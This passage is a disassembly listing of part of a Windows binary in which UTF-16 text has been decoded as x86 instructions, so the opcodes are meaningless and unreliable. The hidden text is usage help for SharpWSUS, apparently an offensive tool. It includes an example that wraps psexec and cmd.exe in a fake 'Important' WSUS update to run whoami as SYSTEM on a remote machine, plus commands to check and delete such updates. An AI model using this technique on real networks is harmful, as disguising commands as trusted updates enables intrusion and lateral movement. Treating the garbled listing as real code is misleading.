  40cd2e:	5b                   	pop    %ebx
  40cd2f:	00 43 00             	add    %al,0x0(%ebx)
  40cd32:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd33:	00 6d 00             	add    %ch,0x0(%ebp)
  40cd36:	70 00                	jo     0x40cd38
  40cd38:	75 00                	jne    0x40cd3a
  40cd3a:	74 00                	je     0x40cd3c
  40cd3c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cd40:	20 00                	and    %al,(%eax)
  40cd42:	74 00                	je     0x40cd44
  40cd44:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd45:	00 20                	add    %ah,(%eax)
  40cd47:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40cd4b:	00 72 00             	add    %dh,0x0(%edx)
  40cd4e:	67 00 65 00          	add    %ah,0x0(%di)
  40cd52:	74 00                	je     0x40cd54
  40cd54:	5d                   	pop    %ebp
  40cd55:	00 20                	add    %ah,(%eax)
  40cd57:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40cd5a:	2f                   	das
  40cd5b:	00 67 00             	add    %ah,0x0(%edi)
  40cd5e:	72 00                	jb     0x40cd60
  40cd60:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd61:	00 75 00             	add    %dh,0x0(%ebp)
  40cd64:	70 00                	jo     0x40cd66
  40cd66:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd67:	00 61 00             	add    %ah,0x0(%ecx)
  40cd6a:	6d                   	insl   (%dx),%es:(%edi)
  40cd6b:	00 65 00             	add    %ah,0x0(%ebp)
  40cd6e:	3a 00                	cmp    (%eax),%al
  40cd70:	5b                   	pop    %ebx
  40cd71:	00 47 00             	add    %al,0x0(%edi)
  40cd74:	72 00                	jb     0x40cd76
  40cd76:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd77:	00 75 00             	add    %dh,0x0(%ebp)
  40cd7a:	70 00                	jo     0x40cd7c
  40cd7c:	20 00                	and    %al,(%eax)
  40cd7e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40cd82:	72 00                	jb     0x40cd84
  40cd84:	20 00                	and    %al,(%eax)
  40cd86:	63 00                	arpl   %eax,(%eax)
  40cd88:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd89:	00 6d 00             	add    %ch,0x0(%ebp)
  40cd8c:	70 00                	jo     0x40cd8e
  40cd8e:	75 00                	jne    0x40cd90
  40cd90:	74 00                	je     0x40cd92
  40cd92:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cd96:	20 00                	and    %al,(%eax)
  40cd98:	74 00                	je     0x40cd9a
  40cd9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd9b:	00 20                	add    %ah,(%eax)
  40cd9d:	00 62 00             	add    %ah,0x0(%edx)
  40cda0:	65 00 20             	add    %ah,%gs:(%eax)
  40cda3:	00 61 00             	add    %ah,0x0(%ecx)
  40cda6:	64 00 64 00 65       	add    %ah,%fs:0x65(%eax,%eax,1)
  40cdab:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40cdaf:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40cdb3:	00 6f 00             	add    %ch,0x0(%edi)
  40cdb6:	5d                   	pop    %ebp
  40cdb7:	00 20                	add    %ah,(%eax)
  40cdb9:	00 2f                	add    %ch,(%edi)
  40cdbb:	00 61 00             	add    %ah,0x0(%ecx)
  40cdbe:	70 00                	jo     0x40cdc0
  40cdc0:	70 00                	jo     0x40cdc2
  40cdc2:	72 00                	jb     0x40cdc4
  40cdc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdc5:	00 76 00             	add    %dh,0x0(%esi)
  40cdc8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cdcc:	3a 00                	cmp    (%eax),%al
  40cdce:	5b                   	pop    %ebx
  40cdcf:	00 4e 00             	add    %cl,0x0(%esi)
  40cdd2:	61                   	popa
  40cdd3:	00 6d 00             	add    %ch,0x0(%ebp)
  40cdd6:	65 00 20             	add    %ah,%gs:(%eax)
  40cdd9:	00 6f 00             	add    %ch,0x0(%edi)
  40cddc:	66 00 20             	data16 add %ah,(%eax)
  40cddf:	00 61 00             	add    %ah,0x0(%ecx)
  40cde2:	70 00                	jo     0x40cde4
  40cde4:	70 00                	jo     0x40cde6
  40cde6:	72 00                	jb     0x40cde8
  40cde8:	6f                   	outsl  %ds:(%esi),(%dx)
  40cde9:	00 76 00             	add    %dh,0x0(%esi)
  40cdec:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cdf0:	5d                   	pop    %ebp
  40cdf1:	00 3e                	add    %bh,(%esi)
  40cdf3:	00 0d 00 0a 00 0d    	add    %cl,0xd000a00
  40cdf9:	00 0a                	add    %cl,(%edx)
  40cdfb:	00 43 00             	add    %al,0x0(%ebx)
  40cdfe:	68 00 65 00 63       	push   $0x63006500
  40ce03:	00 6b 00             	add    %ch,0x0(%ebx)
  40ce06:	20 00                	and    %al,(%eax)
  40ce08:	73 00                	jae    0x40ce0a
  40ce0a:	74 00                	je     0x40ce0c
  40ce0c:	61                   	popa
  40ce0d:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40ce11:	00 73 00             	add    %dh,0x0(%ebx)
  40ce14:	20 00                	and    %al,(%eax)
  40ce16:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce17:	00 66 00             	add    %ah,0x0(%esi)
  40ce1a:	20 00                	and    %al,(%eax)
  40ce1c:	61                   	popa
  40ce1d:	00 6e 00             	add    %ch,0x0(%esi)
  40ce20:	20 00                	and    %al,(%eax)
  40ce22:	75 00                	jne    0x40ce24
  40ce24:	70 00                	jo     0x40ce26
  40ce26:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ce2a:	74 00                	je     0x40ce2c
  40ce2c:	65 00 3a             	add    %bh,%gs:(%edx)
  40ce2f:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40ce35:	00 20                	add    %ah,(%eax)
  40ce37:	00 20                	add    %ah,(%eax)
  40ce39:	00 20                	add    %ah,(%eax)
  40ce3b:	00 53 00             	add    %dl,0x0(%ebx)
  40ce3e:	68 00 61 00 72       	push   $0x72006100
  40ce43:	00 70 00             	add    %dh,0x0(%eax)
  40ce46:	57                   	push   %edi
  40ce47:	00 53 00             	add    %dl,0x0(%ebx)
  40ce4a:	55                   	push   %ebp
  40ce4b:	00 53 00             	add    %dl,0x0(%ebx)
  40ce4e:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40ce52:	78 00                	js     0x40ce54
  40ce54:	65 00 20             	add    %ah,%gs:(%eax)
  40ce57:	00 63 00             	add    %ah,0x0(%ebx)
  40ce5a:	68 00 65 00 63       	push   $0x63006500
  40ce5f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ce62:	20 00                	and    %al,(%eax)
  40ce64:	2f                   	das
  40ce65:	00 75 00             	add    %dh,0x0(%ebp)
  40ce68:	70 00                	jo     0x40ce6a
  40ce6a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ce6e:	74 00                	je     0x40ce70
  40ce70:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40ce74:	64 00 3a             	add    %bh,%fs:(%edx)
  40ce77:	00 5b 00             	add    %bl,0x0(%ebx)
  40ce7a:	55                   	push   %ebp
  40ce7b:	00 70 00             	add    %dh,0x0(%eax)
  40ce7e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ce82:	74 00                	je     0x40ce84
  40ce84:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40ce88:	55                   	push   %ebp
  40ce89:	00 49 00             	add    %cl,0x0(%ecx)
  40ce8c:	44                   	inc    %esp
  40ce8d:	00 5d 00             	add    %bl,0x0(%ebp)
  40ce90:	20 00                	and    %al,(%eax)
  40ce92:	2f                   	das
  40ce93:	00 63 00             	add    %ah,0x0(%ebx)
  40ce96:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce97:	00 6d 00             	add    %ch,0x0(%ebp)
  40ce9a:	70 00                	jo     0x40ce9c
  40ce9c:	75 00                	jne    0x40ce9e
  40ce9e:	74 00                	je     0x40cea0
  40cea0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cea4:	6e                   	outsb  %ds:(%esi),(%dx)
  40cea5:	00 61 00             	add    %ah,0x0(%ecx)
  40cea8:	6d                   	insl   (%dx),%es:(%edi)
  40cea9:	00 65 00             	add    %ah,0x0(%ebp)
  40ceac:	3a 00                	cmp    (%eax),%al
  40ceae:	5b                   	pop    %ebx
  40ceaf:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40ceb3:	00 72 00             	add    %dh,0x0(%edx)
  40ceb6:	67 00 65 00          	add    %ah,0x0(%di)
  40ceba:	74 00                	je     0x40cebc
  40cebc:	20 00                	and    %al,(%eax)
  40cebe:	46                   	inc    %esi
  40cebf:	00 51 00             	add    %dl,0x0(%ecx)
  40cec2:	44                   	inc    %esp
  40cec3:	00 4e 00             	add    %cl,0x0(%esi)
  40cec6:	5d                   	pop    %ebp
  40cec7:	00 0d 00 0a 00 0d    	add    %cl,0xd000a00
  40cecd:	00 0a                	add    %cl,(%edx)
  40cecf:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40ced3:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40ced7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40cedb:	00 20                	add    %ah,(%eax)
  40cedd:	00 75 00             	add    %dh,0x0(%ebp)
  40cee0:	70 00                	jo     0x40cee2
  40cee2:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cee6:	74 00                	je     0x40cee8
  40cee8:	65 00 20             	add    %ah,%gs:(%eax)
  40ceeb:	00 61 00             	add    %ah,0x0(%ecx)
  40ceee:	6e                   	outsb  %ds:(%esi),(%dx)
  40ceef:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40cef3:	00 63 00             	add    %ah,0x0(%ebx)
  40cef6:	6c                   	insb   (%dx),%es:(%edi)
  40cef7:	00 65 00             	add    %ah,0x0(%ebp)
  40cefa:	61                   	popa
  40cefb:	00 6e 00             	add    %ch,0x0(%esi)
  40cefe:	20 00                	and    %al,(%eax)
  40cf00:	75 00                	jne    0x40cf02
  40cf02:	70 00                	jo     0x40cf04
  40cf04:	20 00                	and    %al,(%eax)
  40cf06:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40cf0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf0b:	00 75 00             	add    %dh,0x0(%ebp)
  40cf0e:	70 00                	jo     0x40cf10
  40cf10:	73 00                	jae    0x40cf12
  40cf12:	20 00                	and    %al,(%eax)
  40cf14:	61                   	popa
  40cf15:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40cf19:	00 65 00             	add    %ah,0x0(%ebp)
  40cf1c:	64 00 3a             	add    %bh,%fs:(%edx)
  40cf1f:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40cf25:	00 20                	add    %ah,(%eax)
  40cf27:	00 20                	add    %ah,(%eax)
  40cf29:	00 20                	add    %ah,(%eax)
  40cf2b:	00 53 00             	add    %dl,0x0(%ebx)
  40cf2e:	68 00 61 00 72       	push   $0x72006100
  40cf33:	00 70 00             	add    %dh,0x0(%eax)
  40cf36:	57                   	push   %edi
  40cf37:	00 53 00             	add    %dl,0x0(%ebx)
  40cf3a:	55                   	push   %ebp
  40cf3b:	00 53 00             	add    %dl,0x0(%ebx)
  40cf3e:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40cf42:	78 00                	js     0x40cf44
  40cf44:	65 00 20             	add    %ah,%gs:(%eax)
  40cf47:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40cf4b:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40cf4f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40cf53:	00 20                	add    %ah,(%eax)
  40cf55:	00 2f                	add    %ch,(%edi)
  40cf57:	00 75 00             	add    %dh,0x0(%ebp)
  40cf5a:	70 00                	jo     0x40cf5c
  40cf5c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cf60:	74 00                	je     0x40cf62
  40cf62:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40cf66:	64 00 3a             	add    %bh,%fs:(%edx)
  40cf69:	00 5b 00             	add    %bl,0x0(%ebx)
  40cf6c:	55                   	push   %ebp
  40cf6d:	00 70 00             	add    %dh,0x0(%eax)
  40cf70:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cf74:	74 00                	je     0x40cf76
  40cf76:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40cf7a:	55                   	push   %ebp
  40cf7b:	00 49 00             	add    %cl,0x0(%ecx)
  40cf7e:	44                   	inc    %esp
  40cf7f:	00 5d 00             	add    %bl,0x0(%ebp)
  40cf82:	20 00                	and    %al,(%eax)
  40cf84:	2f                   	das
  40cf85:	00 63 00             	add    %ah,0x0(%ebx)
  40cf88:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf89:	00 6d 00             	add    %ch,0x0(%ebp)
  40cf8c:	70 00                	jo     0x40cf8e
  40cf8e:	75 00                	jne    0x40cf90
  40cf90:	74 00                	je     0x40cf92
  40cf92:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cf96:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf97:	00 61 00             	add    %ah,0x0(%ecx)
  40cf9a:	6d                   	insl   (%dx),%es:(%edi)
  40cf9b:	00 65 00             	add    %ah,0x0(%ebp)
  40cf9e:	3a 00                	cmp    (%eax),%al
  40cfa0:	5b                   	pop    %ebx
  40cfa1:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40cfa5:	00 72 00             	add    %dh,0x0(%edx)
  40cfa8:	67 00 65 00          	add    %ah,0x0(%di)
  40cfac:	74 00                	je     0x40cfae
  40cfae:	20 00                	and    %al,(%eax)
  40cfb0:	46                   	inc    %esi
  40cfb1:	00 51 00             	add    %dl,0x0(%ecx)
  40cfb4:	44                   	inc    %esp
  40cfb5:	00 4e 00             	add    %cl,0x0(%esi)
  40cfb8:	5d                   	pop    %ebp
  40cfb9:	00 20                	add    %ah,(%eax)
  40cfbb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40cfbe:	2f                   	das
  40cfbf:	00 67 00             	add    %ah,0x0(%edi)
  40cfc2:	72 00                	jb     0x40cfc4
  40cfc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfc5:	00 75 00             	add    %dh,0x0(%ebp)
  40cfc8:	70 00                	jo     0x40cfca
  40cfca:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfcb:	00 61 00             	add    %ah,0x0(%ecx)
  40cfce:	6d                   	insl   (%dx),%es:(%edi)
  40cfcf:	00 65 00             	add    %ah,0x0(%ebp)
  40cfd2:	3a 00                	cmp    (%eax),%al
  40cfd4:	5b                   	pop    %ebx
  40cfd5:	00 47 00             	add    %al,0x0(%edi)
  40cfd8:	72 00                	jb     0x40cfda
  40cfda:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfdb:	00 75 00             	add    %dh,0x0(%ebp)
  40cfde:	70 00                	jo     0x40cfe0
  40cfe0:	4e                   	dec    %esi
  40cfe1:	00 61 00             	add    %ah,0x0(%ecx)
  40cfe4:	6d                   	insl   (%dx),%es:(%edi)
  40cfe5:	00 65 00             	add    %ah,0x0(%ebp)
  40cfe8:	5d                   	pop    %ebp
  40cfe9:	00 20                	add    %ah,(%eax)
  40cfeb:	00 2f                	add    %ch,(%edi)
  40cfed:	00 6b 00             	add    %ch,0x0(%ebx)
  40cff0:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40cff4:	70 00                	jo     0x40cff6
  40cff6:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40cffa:	6f                   	outsl  %ds:(%esi),(%dx)
  40cffb:	00 75 00             	add    %dh,0x0(%ebp)
  40cffe:	70 00                	jo     0x40d000
  40d000:	3e 00 0d 00 0a 00 0d 	add    %cl,%ds:0xd000a00
  40d007:	00 0a                	add    %cl,(%edx)
  40d009:	00 23                	add    %ah,(%ebx)
  40d00b:	00 23                	add    %ah,(%ebx)
  40d00d:	00 23                	add    %ah,(%ebx)
  40d00f:	00 23                	add    %ah,(%ebx)
  40d011:	00 23                	add    %ah,(%ebx)
  40d013:	00 20                	add    %ah,(%eax)
  40d015:	00 45 00             	add    %al,0x0(%ebp)
  40d018:	78 00                	js     0x40d01a
  40d01a:	61                   	popa
  40d01b:	00 6d 00             	add    %ch,0x0(%ebp)
  40d01e:	70 00                	jo     0x40d020
  40d020:	6c                   	insb   (%dx),%es:(%edi)
  40d021:	00 65 00             	add    %ah,0x0(%ebp)
  40d024:	73 00                	jae    0x40d026
  40d026:	20 00                	and    %al,(%eax)
  40d028:	23 00                	and    (%eax),%eax
  40d02a:	23 00                	and    (%eax),%eax
  40d02c:	23 00                	and    (%eax),%eax
  40d02e:	23 00                	and    (%eax),%eax
  40d030:	23 00                	and    (%eax),%eax
  40d032:	23 00                	and    (%eax),%eax
  40d034:	0d 00 0a 00 45       	or     $0x45000a00,%eax
  40d039:	00 78 00             	add    %bh,0x0(%eax)
  40d03c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40d040:	75 00                	jne    0x40d042
  40d042:	74 00                	je     0x40d044
  40d044:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40d04a:	20 00                	and    %al,(%eax)
  40d04c:	77 00                	ja     0x40d04e
  40d04e:	68 00 6f 00 61       	push   $0x61006f00
  40d053:	00 6d 00             	add    %ch,0x0(%ebp)
  40d056:	69 00 20 00 61 00    	imul   $0x610020,(%eax),%eax
  40d05c:	73 00                	jae    0x40d05e
  40d05e:	20 00                	and    %al,(%eax)
  40d060:	53                   	push   %ebx
  40d061:	00 59 00             	add    %bl,0x0(%ecx)
  40d064:	53                   	push   %ebx
  40d065:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40d069:	00 4d 00             	add    %cl,0x0(%ebp)
  40d06c:	20 00                	and    %al,(%eax)
  40d06e:	6f                   	outsl  %ds:(%esi),(%dx)
  40d06f:	00 6e 00             	add    %ch,0x0(%esi)
  40d072:	20 00                	and    %al,(%eax)
  40d074:	61                   	popa
  40d075:	00 20                	add    %ah,(%eax)
  40d077:	00 72 00             	add    %dh,0x0(%edx)
  40d07a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40d07e:	6f                   	outsl  %ds:(%esi),(%dx)
  40d07f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40d083:	00 20                	add    %ah,(%eax)
  40d085:	00 6d 00             	add    %ch,0x0(%ebp)
  40d088:	61                   	popa
  40d089:	00 63 00             	add    %ah,0x0(%ebx)
  40d08c:	68 00 69 00 6e       	push   $0x6e006900
  40d091:	00 65 00             	add    %ah,0x0(%ebp)
  40d094:	3a 00                	cmp    (%eax),%al
  40d096:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40d09b:	00 20                	add    %ah,(%eax)
  40d09d:	00 20                	add    %ah,(%eax)
  40d09f:	00 20                	add    %ah,(%eax)
  40d0a1:	00 53 00             	add    %dl,0x0(%ebx)
  40d0a4:	68 00 61 00 72       	push   $0x72006100
  40d0a9:	00 70 00             	add    %dh,0x0(%eax)
  40d0ac:	57                   	push   %edi
  40d0ad:	00 53 00             	add    %dl,0x0(%ebx)
  40d0b0:	55                   	push   %ebp
  40d0b1:	00 53 00             	add    %dl,0x0(%ebx)
  40d0b4:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d0b8:	78 00                	js     0x40d0ba
  40d0ba:	65 00 20             	add    %ah,%gs:(%eax)
  40d0bd:	00 69 00             	add    %ch,0x0(%ecx)
  40d0c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40d0c1:	00 73 00             	add    %dh,0x0(%ebx)
  40d0c4:	70 00                	jo     0x40d0c6
  40d0c6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40d0ca:	74 00                	je     0x40d0cc
  40d0cc:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40d0d1:	00 20                	add    %ah,(%eax)
  40d0d3:	00 20                	add    %ah,(%eax)
  40d0d5:	00 20                	add    %ah,(%eax)
  40d0d7:	00 53 00             	add    %dl,0x0(%ebx)
  40d0da:	68 00 61 00 72       	push   $0x72006100
  40d0df:	00 70 00             	add    %dh,0x0(%eax)
  40d0e2:	57                   	push   %edi
  40d0e3:	00 53 00             	add    %dl,0x0(%ebx)
  40d0e6:	55                   	push   %ebp
  40d0e7:	00 53 00             	add    %dl,0x0(%ebx)
  40d0ea:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d0ee:	78 00                	js     0x40d0f0
  40d0f0:	65 00 20             	add    %ah,%gs:(%eax)
  40d0f3:	00 63 00             	add    %ah,0x0(%ebx)
  40d0f6:	72 00                	jb     0x40d0f8
  40d0f8:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40d0fc:	74 00                	je     0x40d0fe
  40d0fe:	65 00 20             	add    %ah,%gs:(%eax)
  40d101:	00 2f                	add    %ch,(%edi)
  40d103:	00 70 00             	add    %dh,0x0(%eax)
  40d106:	61                   	popa
  40d107:	00 79 00             	add    %bh,0x0(%ecx)
  40d10a:	6c                   	insb   (%dx),%es:(%edi)
  40d10b:	00 6f 00             	add    %ch,0x0(%edi)
  40d10e:	61                   	popa
  40d10f:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40d113:	00 22                	add    %ah,(%edx)
  40d115:	00 43 00             	add    %al,0x0(%ebx)
  40d118:	3a 00                	cmp    (%eax),%al
  40d11a:	5c                   	pop    %esp
  40d11b:	00 55 00             	add    %dl,0x0(%ebp)
  40d11e:	73 00                	jae    0x40d120
  40d120:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40d124:	73 00                	jae    0x40d126
  40d126:	5c                   	pop    %esp
  40d127:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40d12b:	00 73 00             	add    %dh,0x0(%ebx)
  40d12e:	74 00                	je     0x40d130
  40d130:	5c                   	pop    %esp
  40d131:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40d135:	00 63 00             	add    %ah,0x0(%ebx)
  40d138:	75 00                	jne    0x40d13a
  40d13a:	6d                   	insl   (%dx),%es:(%edi)
  40d13b:	00 65 00             	add    %ah,0x0(%ebp)
  40d13e:	6e                   	outsb  %ds:(%esi),(%dx)
  40d13f:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40d143:	00 5c 00 70          	add    %bl,0x70(%eax,%eax,1)
  40d147:	00 73 00             	add    %dh,0x0(%ebx)
  40d14a:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40d14e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40d152:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d156:	78 00                	js     0x40d158
  40d158:	65 00 22             	add    %ah,%gs:(%edx)
  40d15b:	00 20                	add    %ah,(%eax)
  40d15d:	00 2f                	add    %ch,(%edi)
  40d15f:	00 61 00             	add    %ah,0x0(%ecx)
  40d162:	72 00                	jb     0x40d164
  40d164:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40d168:	3a 00                	cmp    (%eax),%al
  40d16a:	22 00                	and    (%eax),%al
  40d16c:	2d 00 61 00 63       	sub    $0x63006100,%eax
  40d171:	00 63 00             	add    %ah,0x0(%ebx)
  40d174:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40d178:	74 00                	je     0x40d17a
  40d17a:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40d17e:	6c                   	insb   (%dx),%es:(%edi)
  40d17f:	00 61 00             	add    %ah,0x0(%ecx)
  40d182:	20 00                	and    %al,(%eax)
  40d184:	2d 00 73 00 20       	sub    $0x20007300,%eax
  40d189:	00 2d 00 64 00 20    	add    %ch,0x20006400
  40d18f:	00 63 00             	add    %ah,0x0(%ebx)
  40d192:	6d                   	insl   (%dx),%es:(%edi)
  40d193:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40d197:	00 65 00             	add    %ah,0x0(%ebp)
  40d19a:	78 00                	js     0x40d19c
  40d19c:	65 00 20             	add    %ah,%gs:(%eax)
  40d19f:	00 2f                	add    %ch,(%edi)
  40d1a1:	00 63 00             	add    %ah,0x0(%ebx)
  40d1a4:	20 00                	and    %al,(%eax)
  40d1a6:	22 00                	and    (%eax),%al
  40d1a8:	22 00                	and    (%eax),%al
  40d1aa:	77 00                	ja     0x40d1ac
  40d1ac:	68 00 6f 00 61       	push   $0x61006f00
  40d1b1:	00 6d 00             	add    %ch,0x0(%ebp)
  40d1b4:	69 00 20 00 3e 00    	imul   $0x3e0020,(%eax),%eax
  40d1ba:	20 00                	and    %al,(%eax)
  40d1bc:	43                   	inc    %ebx
  40d1bd:	00 3a                	add    %bh,(%edx)
  40d1bf:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40d1c3:	00 65 00             	add    %ah,0x0(%ebp)
  40d1c6:	73 00                	jae    0x40d1c8
  40d1c8:	74 00                	je     0x40d1ca
  40d1ca:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  40d1cf:	00 74 00 22          	add    %dh,0x22(%eax,%eax,1)
  40d1d3:	00 22                	add    %ah,(%edx)
  40d1d5:	00 22                	add    %ah,(%edx)
  40d1d7:	00 20                	add    %ah,(%eax)
  40d1d9:	00 2f                	add    %ch,(%edi)
  40d1db:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40d1df:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40d1e3:	00 65 00             	add    %ah,0x0(%ebp)
  40d1e6:	3a 00                	cmp    (%eax),%al
  40d1e8:	22 00                	and    (%eax),%al
  40d1ea:	47                   	inc    %edi
  40d1eb:	00 72 00             	add    %dh,0x0(%edx)
  40d1ee:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40d1f2:	74 00                	je     0x40d1f4
  40d1f4:	20 00                	and    %al,(%eax)
  40d1f6:	55                   	push   %ebp
  40d1f7:	00 70 00             	add    %dh,0x0(%eax)
  40d1fa:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40d1fe:	74 00                	je     0x40d200
  40d200:	65 00 22             	add    %ah,%gs:(%edx)
  40d203:	00 20                	add    %ah,(%eax)
  40d205:	00 2f                	add    %ch,(%edi)
  40d207:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40d20b:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40d20f:	00 3a                	add    %bh,(%edx)
  40d211:	00 32                	add    %dh,(%edx)
  40d213:	00 30                	add    %dh,(%eax)
  40d215:	00 32                	add    %dh,(%edx)
  40d217:	00 31                	add    %dh,(%ecx)
  40d219:	00 2d 00 31 00 30    	add    %ch,0x30003100
  40d21f:	00 2d 00 30 00 33    	add    %ch,0x33003000
  40d225:	00 20                	add    %ah,(%eax)
  40d227:	00 2f                	add    %ch,(%edi)
  40d229:	00 6b 00             	add    %ch,0x0(%ebx)
  40d22c:	62 00                	bound  %eax,(%eax)
  40d22e:	3a 00                	cmp    (%eax),%al
  40d230:	35 00 30 00 30       	xor    $0x30003000,%eax
  40d235:	00 31                	add    %dh,(%ecx)
  40d237:	00 32                	add    %dh,(%edx)
  40d239:	00 33                	add    %dh,(%ebx)
  40d23b:	00 20                	add    %ah,(%eax)
  40d23d:	00 2f                	add    %ch,(%edi)
  40d23f:	00 72 00             	add    %dh,0x0(%edx)
  40d242:	61                   	popa
  40d243:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40d247:	00 6e 00             	add    %ch,0x0(%esi)
  40d24a:	67 00 3a             	add    %bh,(%bp,%si)
  40d24d:	00 49 00             	add    %cl,0x0(%ecx)
  40d250:	6d                   	insl   (%dx),%es:(%edi)
  40d251:	00 70 00             	add    %dh,0x0(%eax)
  40d254:	6f                   	outsl  %ds:(%esi),(%dx)
  40d255:	00 72 00             	add    %dh,0x0(%edx)
  40d258:	74 00                	je     0x40d25a
  40d25a:	61                   	popa
  40d25b:	00 6e 00             	add    %ch,0x0(%esi)
  40d25e:	74 00                	je     0x40d260
  40d260:	20 00                	and    %al,(%eax)
  40d262:	2f                   	das
  40d263:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40d267:	00 73 00             	add    %dh,0x0(%ebx)
  40d26a:	63 00                	arpl   %eax,(%eax)
  40d26c:	72 00                	jb     0x40d26e
  40d26e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40d274:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40d27a:	3a 00                	cmp    (%eax),%al
  40d27c:	22 00                	and    (%eax),%al
  40d27e:	52                   	push   %edx
  40d27f:	00 65 00             	add    %ah,0x0(%ebp)
  40d282:	61                   	popa
  40d283:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40d287:	00 79 00             	add    %bh,0x0(%ecx)
  40d28a:	20 00                	and    %al,(%eax)
  40d28c:	69 00 6d 00 70 00    	imul   $0x70006d,(%eax),%eax
  40d292:	6f                   	outsl  %ds:(%esi),(%dx)
  40d293:	00 72 00             	add    %dh,0x0(%edx)
  40d296:	74 00                	je     0x40d298
  40d298:	61                   	popa
  40d299:	00 6e 00             	add    %ch,0x0(%esi)
  40d29c:	74 00                	je     0x40d29e
  40d29e:	20 00                	and    %al,(%eax)
  40d2a0:	75 00                	jne    0x40d2a2
  40d2a2:	70 00                	jo     0x40d2a4
  40d2a4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
